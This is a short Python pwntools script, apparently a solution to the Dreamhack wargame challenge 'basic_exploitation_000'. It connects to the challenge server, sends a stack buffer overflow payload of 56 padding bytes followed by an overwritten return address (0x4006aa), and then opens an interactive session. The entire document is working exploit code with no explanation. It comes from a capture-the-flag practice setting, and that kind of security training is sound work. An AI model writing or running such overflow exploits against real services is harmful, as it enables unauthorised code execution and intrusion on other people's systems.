from pwn import *

#p = process('./basic_exploitation_000')
p = remote("host3.dreamhack.games",24317)

payload = b''
payload += b'a'*40 + b'b'*16 + p64(0x00000000004006aa)
print(payload)
p.send(payload)

p.interactive()

